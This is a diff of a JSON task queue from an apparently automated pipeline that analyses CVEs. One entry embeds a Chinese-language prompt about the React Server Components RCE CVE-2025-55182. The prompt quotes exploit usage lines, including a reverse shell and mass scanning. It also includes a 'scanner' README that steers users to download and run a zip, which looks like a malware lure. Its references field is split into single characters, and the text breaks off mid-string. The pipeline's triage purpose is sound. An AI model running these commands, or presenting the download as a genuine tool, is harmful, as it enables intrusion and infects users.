@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785442503.924688,
     "last_attempt": 1785992320.2230241,
-    "next_attempt": 1786060322.6007652,
+    "next_attempt": 1786068695.9070122,
     "metadata": {},
     "task_id": "task_CVE-2026-63077_1785442503",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785442509.4010618,
     "last_attempt": 1785992337.752487,
-    "next_attempt": 1786060323.617941,
+    "next_attempt": 1786068667.4299,
     "metadata": {},
     "task_id": "task_CVE-2026-50522_1785442509",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785449276.357688,
     "last_attempt": 1785992332.745636,
-    "next_attempt": 1786060341.4565015,
+    "next_attempt": 1786068673.8199844,
     "metadata": {},
     "task_id": "task_CVE-2026-65883_1785449276",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785449284.7934403,
     "last_attempt": 1786060291.522793,
-    "next_attempt": 1786060373.7638397,
+    "next_attempt": 1786068666.648191,
     "metadata": {},
     "task_id": "task_CVE-2026-63030_1785449284",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785449294.5358305,
     "last_attempt": 1786060296.5867903,
-    "next_attempt": 1786060370.9248443,
+    "next_attempt": 1786068685.5955184,
     "metadata": {},
     "task_id": "task_CVE-2026-60137_1785449294",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785456186.290503,
     "last_attempt": 1786060296.588956,
-    "next_attempt": 1786060368.843914,
+    "next_attempt": 1786068671.9846919,
     "metadata": {},
     "task_id": "task_CVE-2025-32432_1785456186",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992287.2420392,
     "last_attempt": 1786060291.5245886,
-    "next_attempt": 1786060386.8007812,
+    "next_attempt": 1786068682.562212,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1785992287",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992303.7516623,
     "last_attempt": 1786060296.598693,
-    "next_attempt": 1786060391.931303,
+    "next_attempt": 1786068670.446805,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1785992303",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992309.736564,
     "last_attempt": 1786060296.600225,
-    "next_attempt": 1786060372.6790774,
+    "next_attempt": 1786068673.455658,
     "metadata": {},
     "task_id": "task_CVE-2026-34990_1785992309",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992315.2194905,
     "last_attempt": 1786060291.5398304,
-    "next_attempt": 1786060376.2493303,
+    "next_attempt": 1786068670.0473971,
     "metadata": {},
     "task_id": "task_CVE-2026-34980_1785992315",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992320.4952755,
     "last_attempt": 1786060296.607984,
-    "next_attempt": 1786060389.83942,
+    "next_attempt": 1786068675.278752,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1785992320",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992326.5704405,
     "last_attempt": 1786060301.6275957,
-    "next_attempt": 1786060386.5437062,
+    "next_attempt": 1786068681.2062366,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1785992326",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992332.740955,
     "last_attempt": 1786060301.6295917,
-    "next_attempt": 1786060368.2226233,
+    "next_attempt": 1786068692.0299237,
     "metadata": {},
     "task_id": "task_CVE-2025-66398_1785992332",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1785992340.3296504,
     "last_attempt": 1786060296.6099646,
-    "next_attempt": 1786060365.6354332,
+    "next_attempt": 1786068694.890345,
     "metadata": {},
     "task_id": "task_CVE-2026-20841_1785992340",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786001860.4992905,
     "last_attempt": 1786060291.5447905,
-    "next_attempt": 1786060383.5877678,
+    "next_attempt": 1786068682.2124877,
     "metadata": {},
     "task_id": "task_CVE-2026-64633_1786001860",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786001865.8724997,
     "last_attempt": 1786060296.617326,
-    "next_attempt": 1786060385.6544425,
+    "next_attempt": 1786068678.4508708,
     "metadata": {},
     "task_id": "task_CVE-2026-25243_1786001865",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786012195.7964182,
     "last_attempt": 1786060291.561181,
-    "next_attempt": 1786060363.630193,
+    "next_attempt": 1786068667.0875235,
     "metadata": {},
     "task_id": "task_CVE-2025-49844_1786012195",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786012206.664709,
     "last_attempt": 1786060273.9456239,
-    "next_attempt": 1786060314.898849,
+    "next_attempt": 1786068641.0722313,
     "metadata": {},
     "task_id": "task_CVE-2026-57827_1786012206",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786012211.5842793,
     "last_attempt": 1786060276.4922955,
-    "next_attempt": 1786060321.5896075,
+    "next_attempt": 1786068646.7726147,
     "metadata": {},
     "task_id": "task_CVE-2026-45585_1786012211",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786020695.0129168,
     "last_attempt": 1786060286.5169494,
-    "next_attempt": 1786060321.4192014,
+    "next_attempt": 1786068645.6639273,
     "metadata": {},
     "task_id": "task_CVE-2026-31802_1786020695",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786020701.130845,
     "last_attempt": 1786060281.504925,
-    "next_attempt": 1786060316.887945,
+    "next_attempt": 1786068641.9281857,
     "metadata": {},
     "task_id": "task_CVE-2026-0300_1786020701",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786020708.3738523,
     "last_attempt": 1786060301.654952,
-    "next_attempt": 1786060343.6069024,
+    "next_attempt": 1786068644.2546575,
     "metadata": {},
     "task_id": "task_CVE-2026-65058_1786020708",
     "required_result_fields": [
@@ -643,12 +643,12 @@
     "retry_count": 2,
     "max_retries": 5,
     "priority": 2,
-    "status": "pending",
+    "status": "processing",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1786060268.9338098,
     "last_attempt": 1786060291.5628161,
-    "next_attempt": 1786060314.8365722,
+    "next_attempt": 1786068619.2211814,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1786060268",
     "required_result_fields": [
@@ -668,18 +668,48 @@
   },
   {
     "cve_id": "CVE-2025-55182",
-    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-55182\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.\", \"\\u6807\\u9898: React Server Components \\u53cd\\u5e8f\\u5217\\u5316\\u8fdc\\u7a0b\\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e\"], \"published_date\": \"2025-12-03T16:15:56.463\", \"last_modified_date\": \"2026-08-04T05:16:35.063\", \"cvss_score\": 10.0, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"r\", \"e\", \"a\", \"c\", \"t\", \".\", \"d\", \"e\", \"v\", \"/\", \"b\", \"l\", \"o\", \"g\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"0\", \"3\", \"/\", \"c\", \"r\", \"i\", \"t\", \"i\", \"c\", \"a\", \"l\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"-\", \"i\", \"n\", \"-\", \"r\", \"e\", \"a\", \"c\", \"t\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"-\", \"c\", \"o\", \"m\", \"p\", \"o\", \"n\", \"e\", \"n\", \"t\", \"s\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"f\", \"a\", \"c\", \"e\", \"b\", \"o\", \"o\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"0\", \"3\", \"/\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"n\", \"e\", \"w\", \"s\", \".\", \"y\", \"c\", \"o\", \"m\", \"b\", \"i\", \"n\", \"a\", \"t\", \"o\", \"r\", \".\", \"c\", \"o\", \"m\", \"/\", \"i\", \"t\", \"e\", \"m\", \"?\", \"i\", \"d\", \"=\", \"4\", \"6\", \"1\", \"3\", \"6\", \"0\", \"2\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"w\", \"s\", \".\", \"a\", \"m\", \"a\", \"z\", \"o\", \"n\", \".\", \"c\", \"o\", \"m\", \"/\", \"b\", \"l\", \"o\", \"g\", \"s\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"c\", \"h\", \"i\", \"n\", \"a\", \"-\", \"n\", \"e\", \"x\", \"u\", \"s\", \"-\", \"c\", \"y\", \"b\", \"e\", \"r\", \"-\", \"t\", \"h\", \"r\", \"e\", \"a\", \"t\", \"-\", \"g\", \"r\", \"o\", \"u\", \"p\", \"s\", \"-\", \"r\", \"a\", \"p\", \"i\", \"d\", \"l\", \"y\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"-\", \"r\", \"e\", \"a\", \"c\", \"t\", \"2\", \"s\", \"h\", \"e\", \"l\", \"l\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"-\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] React’s CVE-2025-55182 Is Now Actively Exploitable: Verified PoC | OX Security\n [description] Just two days after we published ... exploit has been released publicly. The PoC works exactly as expected and results in unauthenticated remote code execution on vulnerable servers.... Published December 5, 2025\n [link] https://www.ox.security/blog/reacts-cve-2025-55182-is-now-actively-exploitable-verified-poc/\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2025-55182: React2Shell Analysis, Proof-of-Concept Chaos, and In-the-Wild Exploitation | Trend Micro (US)\n [description] December 10, 2025 - Trend™ Research observed that CVE-2025-55182, as of this writing, is being exploited in-the-wild, and in several malware campaigns such as the emerald and nuts campaigns. Several of these are attacks that execute Cobalt Strike beacons generated with Cross C2, deploy Nezha, Fast Reverse Proxy (FRP), the Sliver payload, and the Secret-Hunter payload. Trend Research provides patch and PoC landscape analysis and clarifies misconceptions about the React2Shell vulnerability to minimize chances of the deployment of ineffective defenses as well as fear, uncertainty, and doubt regarding CVE-2025-55182.\n [link] https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - imbas007/POC-CVE-2025-55182 · GitHub\n [description] usage: CVE-2025-55182-Exp.py [-h] [-u URL] [-l LIST] [-c COMMAND] [-i] [--revshell LHOST LPORT] [-t THREADS] [--proxy PROXY] [--timeout TIMEOUT] [-v] # Single target exploit python3 CVE-2025-55182-Exp.py -u http://target:3000 -c \"id\" # Interactive shell python3 CVE-2025-55182-Exp.py -u http://target:3000 -i # Reverse shell python3 CVE-2025-55182-Exp.py -u http://target:3000 --revshell 10.10.10.10 4444 # Mass scan from file python3 CVE-2025-55182-Exp.py -l targets.txt -c \"whoami\" -t 10 # With proxy python3 CVE-2025-55182-Exp.py -u http://target:3000 -c \"id\" --proxy http://127.0.0.1:8080\n [link] https://github.com/imbas007/POC-CVE-2025-55182\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - acheong08/CVE-2025-55182-poc: Actual CVE-2025-55182 detection and exploit. No bullshit LLMs. · GitHub\n [description] React Flight protocol vulnerability allowing prototype chain traversal via chunk references.\n [link] https://github.com/acheong08/CVE-2025-55182-poc\n [webpage 3 end]\n[webpage 4 begin] [title] cve-2025-55182 · GitHub Topics · GitHub\n [description] 🚨 Exploit CVE-2025-55182, a critical RCE vulnerability in React Server Components for Next.js apps; enables testing for prototype pollution risks. react python exploit scanner nextjs poc rce vulnerability exp massive dify react-server-component ...\n [link] https://github.com/topics/cve-2025-55182?o=desc&s=updated\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/23c8cc2ab9eba95954a2c7a44b20dc4b/LICENSE\n---\nMIT License\n\nCopyright (c) 2025 Vicky\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/23c8cc2ab9eba95954a2c7a44b20dc4b/README.md\n---\n# 🔍 CVE-2025-55182-Scanner - Detect and Secure Your Applications\n\n## 🌟 Overview\nCVE-2025-55182-Scanner is a hybrid security scanner designed to help you identify vulnerabilities in https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip and Waku applications. This tool combines static code analysis with safe dynamic verification, making it ideal for DevSecOps workflows. Whether you’re a developer or just a concerned user, this scanner will help you secure your applications against potential threats.\n\n## 🚀 Getting Started\nTo get started with CVE-2025-55182-Scanner, follow these simple steps:\n\n1. **Visit the Releases Page:** Click the button below to go to the GitHub Releases page.\n\n   [![Download CVE-2025-55182-Scanner](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip%20Now!-CVE-2025--55182--Scanner-blue)](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip)\n\n2. **Download the Latest Version:** On the Releases page, find the latest version of the application. Look for files named with the application version (e.g., https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip). Click the file to download it to your computer.\n\n3. **Install the Application:** After downloading, locate the file on your computer. Double-click the file to start the installation process. Follow the prompts to complete the installation.\n\n4. **Run the Scanner:** Once installed, you can start CVE-2025-55182-Scanner from your applications list. \n\n5. **Begin Scanning:** Input the necessary details of your https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip or Waku application and click \"Scan.\" The scanner will analyze your project for vulnerabilities.\n\n## ⚙️ System Requirements\n- **Operating System:** Windows 10 or later, macOS Mojave or later, or a 64-bit version of Linux.\n- **RAM:** At least 4 GB of RAM.\n- **Disk Space:** Minimum of 500 MB free space for installation.\n- **Network:** Internet connection recommended for updates and additional resources.\n\n## 📥 Download & Install\nTo download CVE-2025-55182-Scanner, please revisit the [Releases page](https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip). Start by clicking the link above. Choose the version that suits your operating system and download it.\n\n1. **Download the File:** Click on the appropriate file for your operating system to initiate the download.\n2. **Install the Application:** Follow the on-screen instructions to install the software.\n3. **Open the Software:** You will find CVE-2025-55182-Scanner in your application menu or desktop.\n\n## 🔒 Features\n- **Static Code Analysis:** Scan your code for vulnerabilities without running the application.\n- **Dynamic Verification:** Run the app in a safe environment to perform real-time checks for security issues.\n- **User-Friendly Interface:** Designed for non-technical users to easily navigate and operate.\n- **Reports and Recommendations:** Get detailed reports about vulnerabilities found and recommendations for fixes.\n\n## 📊 Usage Instructions\nAfter installation, you can follow these steps to effectively use CVE-2025-55182-Scanner:\n\n1. **Open the Application:** Launch CVE-2025-55182-Scanner from your computer.\n2. **Input Application Details:** Enter the URL or path of your https://raw.githubusercontent.com/captain4554/CVE-2025-55182-Scanner/main/scanner/CV-Scanner-v2.4.zip or Waku application.\n3. **Choose Scan Type:** Select either \"Static Analysis\" or \"Dynamic Verification\" based on your requirements.\n4. **Start Scan:** Click the \"Scan\" button to begin the process. Wait for the scan to complete.\n5. **Vi\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 2,
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-55182\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.\", \"\\u6807\\u9898: React Server Components \\u53cd\\u5e8f\\u5217\\u5316\\u8fdc\\u7a0b\\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e\"], \"published_date\": \"2025-12-03T16:15:56.463\", \"last_modified_date\": \"2026-08-04T05:16:35.063\", \"cvss_score\": 10.0, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"r\", \"e\", \"a\", \"c\", \"t\", \".\", \"d\", \"e\", \"v\", \"/\", \"b\", \"l\", \"o\", \"g\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"0\", \"3\", \"/\", \"c\", \"r\", \"i\", \"t\", \"i\", \"c\", \"a\", \"l\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"-\", \"i\", \"n\", \"-\", \"r\", \"e\", \"a\", \"c\", \"t\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"-\", \"c\", \"o\", \"m\", \"p\", \"o\", \"n\", \"e\", \"n\", \"t\", \"s\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"f\", \"a\", \"c\", \"e\", \"b\", \"o\", \"o\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"0\", \"3\", \"/\", \"4\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"n\", \"e\", \"w\", \"s\", \".\", \"y\", \"c\", \"o\", \"m\", \"b\", \"i\", \"n\", \"a\", \"t\", \"o\", \"r\", \".\", \"c\", \"o\", \"m\", \"/\", \"i\", \"t\", \"e\", \"m\", \"?\", \"i\", \"d\", \"=\", \"4\", \"6\", \"1\", \"3\", \"6\", \"0\", \"2\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"w\", \"s\", \".\", \"a\", \"m\", \"a\", \"z\", \"o\", \"n\", \".\", \"c\", \"o\", \"m\", \"/\", \"b\", \"l\", \"o\", \"g\", \"s\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"c\", \"h\", \"i\", \"n\", \"a\", \"-\", \"n\", \"e\", \"x\", \"u\", \"s\", \"-\", \"c\", \"y\", \"b\", \"e\", \"r\", \"-\", \"t\", \"h\", \"r\", \"e\", \"a\", \"t\", \"-\", \"g\", \"r\", \"o\", \"u\", \"p\", \"s\", \"-\", \"r\", \"a\", \"p\", \"i\", \"d\", \"l\", \"y\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"-\", \"r\", \"e\", \"a\", \"c\", \"t\", \"2\", \"s\", \"h\", \"e\", \"l\", \"l\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"y\", \"-\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"5\", \"1\", \"8\", \"2\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] React’s CVE-2025-55182 Is Now Actively Exploitable: Verified PoC | OX Security\n [description] Just two days after we published ... exploit has been released publicly. The PoC works exactly as expected and results in unauthenticated remote code execution on vulnerable servers.... Published December 5, 2025\n [link] https://www.ox.security/blog/reacts-cve-2025-55182-is-now-actively-exploitable-verified-poc/\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2025-55182: React2Shell Analysis, Proof-of-Concept Chaos, and In-the-Wild Exploitation | Trend Micro (US)\n [description] December 10, 2025 - Trend™ Research observed that CVE-2025-55182, as of this writing, is being exploited in-the-wild, and in several malware campaigns such as the emerald and nuts campaigns. Several of these are attacks that execute Cobalt Strike beacons generated with Cross C2, deploy Nezha, Fast Reverse Proxy (FRP), the Sliver payload, and the Secret-Hunter payload. Trend Research provides patch and PoC landscape analysis and clarifies misconceptions about the React2Shell vulnerability to minimize chances of the deployment of ineffective defenses as well as fear, uncertainty, and doubt regarding CVE-2025-55182.\n [link] https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - imbas007/POC-CVE-2025-55182 · GitHub\n [description] usage: CVE-2025-55182-Exp.py [-h] [-u URL] [-l LIST] [-c COMMAND] [-i] [--revshell LHOST LPORT] [-t THREADS] [--proxy PROXY] [--timeout TIMEOUT] [-v] # Single target exploit python3 CVE-2025-55182-Exp.py -u http://target:3000 -c \"id\" # Interactive shell python3 CVE-2025-55182-Exp.py -u http://target:3000 -i # Reverse shell python3 CVE-2025-55182-Exp.py -u http://target:3000 --revshell 10.10.10.10 4444 # Mass scan from file python3 CVE-2025-55182-Exp.py 